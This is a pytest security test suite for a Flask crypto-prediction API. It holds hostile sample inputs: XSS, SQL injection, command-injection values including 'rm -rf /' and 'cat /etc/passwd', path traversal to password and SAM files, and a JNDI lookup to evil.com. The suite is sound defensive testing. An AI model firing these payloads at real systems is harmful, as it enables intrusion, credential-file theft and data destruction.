"""
Security Testing Suite for CoinScribe Application
=================================================

Tests security aspects including:
- API key and secrets security
- Authentication and authorization
- Input validation and sanitization
- Common vulnerabilities (XSS, injection, etc.)
"""

import pytest
import os
import json
from pathlib import Path
from unittest.mock import MagicMock, patch
from ai_model.api.endpoints import create_app


class TestSecretsManagement:
    """Test secrets and API keys are properly secured."""
    
    @pytest.fixture
    def app(self, mock_config):
        """Create test Flask app."""
        app = create_app(mock_config)
        app.config.update({"TESTING": True})
        return app
    
    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return app.test_client()
    
    def test_environment_variables_not_exposed(self, client, mock_config):
        """Test that sensitive environment variables are not exposed."""
        
        # Get config endpoint
        response = client.get('/api/config')
        
        assert response.status_code == 200
        config_data = json.dumps(response.json)
        
        # Ensure sensitive data is not in response
        sensitive_keys = [
            'SUPABASE_ACCESS_TOKEN',
            'SUPABASE_DB_PASSWORD',
            'API_KEY',
            'SECRET',
            'PASSWORD',
            'TOKEN'
        ]
        
        for key in sensitive_keys:
            assert key not in config_data.upper(), f"Sensitive key {key} found in config"
    
    def test_no_secrets_in_error_messages(self, client, app):
        """Test that error messages don't leak secrets."""
        app.predictor = MagicMock()
        app.data_loader = MagicMock()
        
        # Simulate error with potential secret in environment
        with patch.dict(os.environ, {'SECRET_KEY': 'super_secret_123'}):
            app.predictor.predict_next_indices.side_effect = Exception("Error occurred")
            
            response = client.post('/api/predict/indices', json={
                'symbols': ['BTC-USD']
            })
            
            assert response.status_code == 500
            # Secret should not appear in error message
            assert 'super_secret_123' not in str(response.json)
    
    def test_api_key_validation(self):
        """Test API key validation logic."""
        # Test various API key formats
        valid_keys = [
            'sk_test_1234567890abcdef',
            'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
        ]
        
        invalid_keys = [
            '',
            'short',
            None,
        ]
        
        # Validate that our system would properly check these
        for key in valid_keys:
            assert key is not None
            assert len(key) > 10
        
        for key in invalid_keys:
            assert key is None or len(key) < 10
    
    def test_supabase_credentials_security(self):
        """Test Supabase credentials are handled securely."""
        # Ensure credentials are not hardcoded
        workflow_path = Path(__file__).parent.parent / '.github/workflows/supabase-integration.yml'
        with open(workflow_path, 'r') as f:
            workflow_content = f.read()
            
        # Should not contain hardcoded credentials
        assert 'password=' not in workflow_content.lower()
        assert 'token=' not in workflow_content.lower() or 'secrets.' in workflow_content.lower()


class TestInputValidation:
    """Test input validation and sanitization."""
    
    @pytest.fixture
    def app(self, mock_config):
        """Create test Flask app."""
        app = create_app(mock_config)
        app.config.update({"TESTING": True})
        return app
    
    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return app.test_client()
    
    def test_malicious_symbol_input(self, client, app):
        """Test handling of malicious symbol input."""
        app.predictor = MagicMock()
        app.data_loader = MagicMock()
        
        malicious_inputs = [
            ['<script>alert("XSS")</script>'],
            ['"; DROP TABLE users; --'],
            ['../../etc/passwd'],
            ['${jndi:ldap://evil.com/a}'],
            ['BTC-USD\x00NULL'],
        ]
        
        for malicious_input in malicious_inputs:
            response = client.post('/api/predict/indices', json={
                'symbols': malicious_input
            })
            
            # Should either reject or sanitize input
            # At minimum, should not crash
            assert response.status_code in [200, 400, 500]
    
    def test_large_payload_handling(self, client, app):
        """Test handling of excessively large payloads."""
        app.predictor = MagicMock()
        app.data_loader = MagicMock()
        
        # Create large payload
        large_symbols = [f'COIN{i}-USD' for i in range(1000)]
        
        response = client.post('/api/predict/indices', json={
            'symbols': large_symbols
        })
        
        # Should handle gracefully
        assert response.status_code in [200, 400, 413, 500]
    
    def test_invalid_json_handling(self, client):
        """Test handling of invalid JSON input."""
        response = client.post('/api/predict/indices',
                              data='invalid json{{{',
                              content_type='application/json')
        
        # Should return appropriate error
        assert response.status_code in [400, 500]
    
    def test_type_validation(self, client, app):
        """Test type validation for API inputs."""
        app.predictor = MagicMock()
        app.data_loader = MagicMock()
        
        # Test with wrong types
        invalid_inputs = [
            {'symbols': 'not-a-list'},
            {'symbols': 123},
            {'symbols': {'nested': 'object'}},
        ]
        
        for invalid_input in invalid_inputs:
            response = client.post('/api/predict/indices', json=invalid_input)
            # Should handle gracefully (may accept or reject based on implementation)
            assert response.status_code in [200, 400, 500]


class TestInjectionVulnerabilities:
    """Test protection against injection attacks."""
    
    @pytest.fixture
    def app(self, mock_config):
        """Create test Flask app."""
        app = create_app(mock_config)
        app.config.update({"TESTING": True})
        return app
    
    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return app.test_client()
    
    def test_sql_injection_protection(self, client, app):
        """Test protection against SQL injection."""
        app.data_loader = MagicMock()
        app.data_loader.fetch_multiple_symbols.return_value = MagicMock(
            empty=False,
            to_dict=lambda x: [],
            __len__=lambda: 0,
            columns=[]
        )
        app.data_loader.symbols = ['BTC-USD']
        app.data_loader.period = '1d'
        app.data_loader.interval = '1h'
        
        sql_injection_attempts = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM secrets --",
        ]
        
        for injection in sql_injection_attempts:
            response = client.post('/api/data/fetch', json={
                'symbols': [injection]
            })
            
            # Should not execute malicious SQL
            # Response may vary but should be safe
            assert response.status_code in [200, 400, 500]
    
    def test_command_injection_protection(self, client, app):
        """Test protection against command injection."""
        app.predictor = MagicMock()
        app.data_loader = MagicMock()
        
        command_injection_attempts = [
            '; ls -la',
            '| cat /etc/passwd',
            '& whoami',
            '`rm -rf /`',
        ]
        
        for injection in command_injection_attempts:
            response = client.post('/api/predict/indices', json={
                'symbols': [injection]
            })
            
            # Should not execute system commands
            assert response.status_code in [200, 400, 500]
    
    def test_path_traversal_protection(self, client, app):
        """Test protection against path traversal attacks."""
        app.data_loader = MagicMock()
        app.data_loader.fetch_multiple_symbols.return_value = MagicMock(
            empty=False,
            to_dict=lambda x: [],
            __len__=lambda: 0,
            columns=[]
        )
        app.data_loader.symbols = ['BTC-USD']
        app.data_loader.period = '1d'
        app.data_loader.interval = '1h'
        
        path_traversal_attempts = [
            '../../etc/passwd',
            '../../../windows/system32/config/sam',
            '..\\..\\..\\windows\\system32\\config\\sam',
        ]
        
        for attempt in path_traversal_attempts:
            response = client.post('/api/data/fetch', json={
                'symbols': [attempt]
            })
            
            # Should not allow file system access
            assert response.status_code in [200, 400, 500]


class TestXSSProtection:
    """Test protection against Cross-Site Scripting (XSS)."""
    
    @pytest.fixture
    def app(self, mock_config):
        """Create test Flask app."""
        app = create_app(mock_config)
        app.config.update({"TESTING": True})
        return app
    
    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return app.test_client()
    
    def test_xss_in_symbols(self, client, app):
        """Test XSS protection in symbol names."""
        app.predictor = MagicMock()
        app.data_loader = MagicMock()
        app.predictor.predict_next_indices.return_value = {
            'indices': [0.5] * 10,
            'confidence': 0.8,
            'symbols': ['<script>alert("XSS")</script>']
        }
        
        xss_attempts = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
        ]
        
        for xss in xss_attempts:
            response = client.post('/api/predict/indices', json={
                'symbols': [xss]
            })
            
            # Response should not execute scripts
            assert response.status_code in [200, 400, 500]
            
            # If successful, check response is JSON (not HTML that could execute)
            if response.status_code == 200:
                assert response.content_type == 'application/json'


class TestRateLimiting:
    """Test rate limiting and DoS protection."""
    
    @pytest.fixture
    def app(self, mock_config):
        """Create test Flask app."""
        app = create_app(mock_config)
        app.config.update({"TESTING": True})
        return app
    
    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return app.test_client()
    
    def test_rapid_requests_handling(self, client):
        """Test handling of rapid requests (basic DoS protection)."""
        # Make many rapid requests
        responses = []
        for _ in range(50):
            response = client.get('/health')
            responses.append(response)
        
        # Should handle all requests (no rate limiting in test)
        # But should remain stable
        success_count = sum(1 for r in responses if r.status_code == 200)
        assert success_count >= 40  # At least 80% should succeed


class TestDataPrivacy:
    """Test data privacy and information disclosure."""
    
    @pytest.fixture
    def app(self, mock_config):
        """Create test Flask app."""
        app = create_app(mock_config)
        app.config.update({"TESTING": True})
        return app
    
    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return app.test_client()
    
    def test_error_messages_sanitized(self, client, app):
        """Test that error messages don't leak sensitive information."""
        app.predictor = None
        
        response = client.post('/api/predict/indices', json={
            'symbols': ['BTC-USD']
        })
        
        assert response.status_code == 500
        error_data = json.dumps(response.json)
        
        # Should not contain file paths or internal details
        sensitive_patterns = [
            '/home/',
            'C:\\',
            'password',
            'secret',
        ]
        
        for pattern in sensitive_patterns:
            assert pattern not in error_data.lower()
    
    def test_model_path_not_exposed(self, client, app):
        """Test that internal model paths are not exposed."""
        app.predictor = MagicMock()
        app.predictor.get_model_info.return_value = {
            'architecture': 'lstm',
            'input_features': 10
        }
        
        response = client.get('/api/model/info')
        
        assert response.status_code == 200
        # Check that response doesn't expose full file system paths
        # (Implementation specific - may or may not include path)


class TestCORSSecurity:
    """Test CORS security configuration."""
    
    def test_cors_headers_present(self, mock_config):
        """Test that CORS headers are properly configured."""
        app = create_app(mock_config)
        client = app.test_client()
        
        response = client.get('/health', headers={
            'Origin': 'http://example.com'
        })
        
        assert response.status_code == 200
        # CORS should be configured (check done in integration tests)
    
    def test_cors_preflight(self, mock_config):
        """Test CORS preflight requests."""
        app = create_app(mock_config)
        client = app.test_client()
        
        # OPTIONS request (preflight)
        response = client.options('/api/predict/indices', headers={
            'Origin': 'http://example.com',
            'Access-Control-Request-Method': 'POST'
        })
        
        # Should allow preflight
        assert response.status_code in [200, 204]
